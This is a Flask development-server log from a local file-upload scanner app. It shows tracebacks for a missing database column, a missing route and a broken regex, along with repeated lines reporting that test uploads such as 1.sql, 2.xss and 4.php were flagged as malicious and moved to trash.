  File "app.py", line 99, in upload_file
    cursor.execute("INSERT INTO files (filename, status) VALUES (?, ?)", (file.filename, "Safe"))
sqlite3.OperationalError: table files has no column named status
2025-02-22 16:41:53,811 - 127.0.0.1 - - [22/Feb/2025 16:41:53] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 16:41:55,567 - 127.0.0.1 - - [22/Feb/2025 16:41:55] "GET / HTTP/1.1" 200 -
2025-02-22 16:42:05,253 - 127.0.0.1 - - [22/Feb/2025 16:42:05] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:42:05,257 - 127.0.0.1 - - [22/Feb/2025 16:42:05] "GET / HTTP/1.1" 200 -
2025-02-22 16:45:04,327 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:45:04,347 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:45:04,347 - Error scanning uploads/6.js: missing ), unterminated subpattern at position 17
2025-02-22 16:45:04,347 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:45:04,349 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:45:04,349 - [33mPress CTRL+C to quit[0m
2025-02-22 16:45:07,235 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 75, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:45:07,237 - 127.0.0.1 - - [22/Feb/2025 16:45:07] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:45:08,491 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 75, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:45:08,492 - 127.0.0.1 - - [22/Feb/2025 16:45:08] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:45:16,309 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:45:16,329 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:45:16,329 - Error scanning uploads/6.js: missing ), unterminated subpattern at position 17
2025-02-22 16:45:16,329 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:45:16,331 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:45:16,331 - [33mPress CTRL+C to quit[0m
2025-02-22 16:45:18,133 - 127.0.0.1 - - [22/Feb/2025 16:45:18] "GET / HTTP/1.1" 200 -
2025-02-22 16:45:39,601 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:45:39,621 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:45:39,621 - Error scanning uploads/6.js: missing ), unterminated subpattern at position 17
2025-02-22 16:45:39,621 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:46:19,165 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:46:19,185 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:46:19,186 - Error scanning uploads/6.js: missing ), unterminated subpattern at position 17
2025-02-22 16:46:19,186 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:46:19,188 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:46:19,188 - [33mPress CTRL+C to quit[0m
2025-02-22 16:47:16,180 - Malicious pattern detected in uploads/6.js
2025-02-22 16:47:16,180 - Moved 6.js to trash due to suspicious content.
2025-02-22 16:47:16,182 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:47:16,182 - [33mPress CTRL+C to quit[0m
2025-02-22 16:47:20,231 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 76, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:47:20,234 - 127.0.0.1 - - [22/Feb/2025 16:47:20] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:48:06,922 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:48:06,922 - [33mPress CTRL+C to quit[0m
2025-02-22 16:48:09,681 - 127.0.0.1 - - [22/Feb/2025 16:48:09] "GET / HTTP/1.1" 200 -
2025-02-22 16:48:15,188 - Malicious pattern detected in uploads/4.php
2025-02-22 16:48:15,189 - 127.0.0.1 - - [22/Feb/2025 16:48:15] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:48:15,194 - 127.0.0.1 - - [22/Feb/2025 16:48:15] "GET / HTTP/1.1" 200 -
2025-02-22 16:48:22,061 - Malicious pattern detected in uploads/app.py
2025-02-22 16:48:22,062 - 127.0.0.1 - - [22/Feb/2025 16:48:22] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:48:22,067 - 127.0.0.1 - - [22/Feb/2025 16:48:22] "GET / HTTP/1.1" 200 -
2025-02-22 16:48:28,490 - Malicious pattern detected in uploads/6.js
2025-02-22 16:48:28,491 - 127.0.0.1 - - [22/Feb/2025 16:48:28] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:48:28,496 - 127.0.0.1 - - [22/Feb/2025 16:48:28] "GET / HTTP/1.1" 200 -
2025-02-22 16:49:21,239 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 103, in upload_file
    cursor.execute("INSERT INTO files (filename, status) VALUES (?, ?)", (file.filename, "Safe"))
sqlite3.OperationalError: table files has no column named status
2025-02-22 16:49:21,241 - 127.0.0.1 - - [22/Feb/2025 16:49:21] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 16:49:22,922 - 127.0.0.1 - - [22/Feb/2025 16:49:22] "GET / HTTP/1.1" 200 -
2025-02-22 16:49:28,417 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 103, in upload_file
    cursor.execute("INSERT INTO files (filename, status) VALUES (?, ?)", (file.filename, "Safe"))
sqlite3.OperationalError: table files has no column named status
2025-02-22 16:49:28,418 - 127.0.0.1 - - [22/Feb/2025 16:49:28] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 16:49:29,781 - 127.0.0.1 - - [22/Feb/2025 16:49:29] "GET / HTTP/1.1" 200 -
2025-02-22 16:51:01,321 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:51:01,321 - [33mPress CTRL+C to quit[0m
2025-02-22 16:51:05,865 - 127.0.0.1 - - [22/Feb/2025 16:51:05] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:51:05,877 - 127.0.0.1 - - [22/Feb/2025 16:51:05] "GET / HTTP/1.1" 200 -
2025-02-22 16:51:10,861 - 127.0.0.1 - - [22/Feb/2025 16:51:10] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:51:10,865 - 127.0.0.1 - - [22/Feb/2025 16:51:10] "GET / HTTP/1.1" 200 -
2025-02-22 16:51:41,774 - Malicious pattern detected in uploads/1.sql
2025-02-22 16:51:41,775 - 127.0.0.1 - - [22/Feb/2025 16:51:41] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:51:41,780 - 127.0.0.1 - - [22/Feb/2025 16:51:41] "GET / HTTP/1.1" 200 -
2025-02-22 16:52:56,583 - 127.0.0.1 - - [22/Feb/2025 16:52:56] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:52:56,588 - 127.0.0.1 - - [22/Feb/2025 16:52:56] "GET / HTTP/1.1" 200 -
2025-02-22 16:55:11,288 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:55:11,289 - [33mPress CTRL+C to quit[0m
2025-02-22 16:55:16,911 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 76, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:55:16,914 - 127.0.0.1 - - [22/Feb/2025 16:55:16] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:55:18,295 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 76, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:55:18,296 - 127.0.0.1 - - [22/Feb/2025 16:55:18] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:55:18,475 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 76, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:55:18,476 - 127.0.0.1 - - [22/Feb/2025 16:55:18] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:55:39,396 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:55:39,396 - [33mPress CTRL+C to quit[0m
2025-02-22 16:55:42,265 - 127.0.0.1 - - [22/Feb/2025 16:55:42] "GET / HTTP/1.1" 200 -
2025-02-22 16:55:53,900 - Malicious pattern detected in uploads/1.sql
2025-02-22 16:55:53,902 - 127.0.0.1 - - [22/Feb/2025 16:55:53] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:55:53,906 - 127.0.0.1 - - [22/Feb/2025 16:55:53] "GET / HTTP/1.1" 200 -
2025-02-22 16:56:02,216 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 16:56:02,216 - Moved 3.py to trash due to suspicious content.
2025-02-22 16:56:02,216 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 16:56:02,216 - Moved 4.php to trash due to suspicious content.
2025-02-22 16:56:02,216 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 16:56:02,217 - Moved 1.sql to trash due to suspicious content.
2025-02-22 16:56:02,217 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 16:56:02,217 - Moved 2.xss to trash due to suspicious content.
2025-02-22 16:56:02,217 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 16:56:02,217 - Moved 6.js to trash due to suspicious content.
2025-02-22 16:56:02,217 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 16:56:02,217 - Moved 5.txt to trash due to suspicious content.
2025-02-22 16:56:02,220 - 127.0.0.1 - - [22/Feb/2025 16:56:02] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:56:02,225 - 127.0.0.1 - - [22/Feb/2025 16:56:02] "GET / HTTP/1.1" 200 -
2025-02-22 16:56:14,325 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 16:56:14,325 - Moved 3.py to trash due to suspicious content.
2025-02-22 16:56:14,325 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 16:56:14,325 - Moved 4.php to trash due to suspicious content.
2025-02-22 16:56:14,325 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 16:56:14,325 - Moved 1.sql to trash due to suspicious content.
2025-02-22 16:56:14,326 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 16:56:14,326 - Moved 2.xss to trash due to suspicious content.
2025-02-22 16:56:14,326 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 16:56:14,326 - Moved 6.js to trash due to suspicious content.
2025-02-22 16:56:14,326 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 16:56:14,326 - Moved 5.txt to trash due to suspicious content.
2025-02-22 16:56:14,328 - 127.0.0.1 - - [22/Feb/2025 16:56:14] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:56:14,332 - 127.0.0.1 - - [22/Feb/2025 16:56:14] "GET / HTTP/1.1" 200 -
2025-02-22 17:01:18,622 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:01:18,622 - [33mPress CTRL+C to quit[0m
2025-02-22 17:01:21,480 - 127.0.0.1 - - [22/Feb/2025 17:01:21] "GET / HTTP/1.1" 200 -
2025-02-22 17:01:36,407 - Malicious pattern detected in uploads/test/3.py
2025-02-22 17:01:36,408 - 127.0.0.1 - - [22/Feb/2025 17:01:36] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:01:36,412 - 127.0.0.1 - - [22/Feb/2025 17:01:36] "GET / HTTP/1.1" 200 -
2025-02-22 17:03:48,601 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 17:03:48,601 - [33mPress CTRL+C to quit[0m
2025-02-22 17:03:52,225 - 127.0.0.1 - - [22/Feb/2025 17:03:52] "GET / HTTP/1.1" 200 -
2025-02-22 17:03:58,094 - Malicious pattern detected in uploads/app.py
2025-02-22 17:03:58,095 - 127.0.0.1 - - [22/Feb/2025 17:03:58] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:03:58,100 - 127.0.0.1 - - [22/Feb/2025 17:03:58] "GET / HTTP/1.1" 200 -
2025-02-22 17:04:10,845 - 127.0.0.1 - - [22/Feb/2025 17:04:10] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:04:10,850 - 127.0.0.1 - - [22/Feb/2025 17:04:10] "GET / HTTP/1.1" 200 -
2025-02-22 17:04:20,147 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:04:20,147 - Moved 3.py to trash due to suspicious content.
2025-02-22 17:04:20,147 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:04:20,148 - Moved 4.php to trash due to suspicious content.
2025-02-22 17:04:20,148 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:04:20,148 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:04:20,148 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:04:20,148 - Moved 2.xss to trash due to suspicious content.
2025-02-22 17:04:20,148 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:04:20,148 - Moved 6.js to trash due to suspicious content.
2025-02-22 17:04:20,148 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:04:20,148 - Moved 5.txt to trash due to suspicious content.
2025-02-22 17:04:20,151 - 127.0.0.1 - - [22/Feb/2025 17:04:20] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:04:20,155 - 127.0.0.1 - - [22/Feb/2025 17:04:20] "GET / HTTP/1.1" 200 -
2025-02-22 17:04:28,060 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 17:04:28,060 - Moved 3.py to trash due to suspicious content.
2025-02-22 17:04:28,061 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 17:04:28,061 - Moved 4.php to trash due to suspicious content.
2025-02-22 17:04:28,061 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 17:04:28,061 - Moved 1.sql to trash due to suspicious content.
2025-02-22 17:04:28,061 - Malicious pattern detected in uploads/test/test/2.xss
2025-02-22 17:04:28,061 - Moved 2.xss to trash due to suspicious content.
2025-02-22 17:04:28,061 - Malicious pattern detected in uploads/test/test/6.js
2025-02-22 17:04:28,061 - Moved 6.js to trash due to suspicious content.
2025-02-22 17:04:28,061 - Malicious pattern detected in uploads/test/test/5.txt
2025-02-22 17:04:28,061 - Moved 5.txt to trash due to suspicious content.
2025-02-22 17:04:28,064 - 127.0.0.1 - - [22/Feb/2025 17:04:28] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 17:04:28,068 - 127.0.0.1 - - [22/Feb/2025 17:04:28] "GET / HTTP/1.1" 200 -
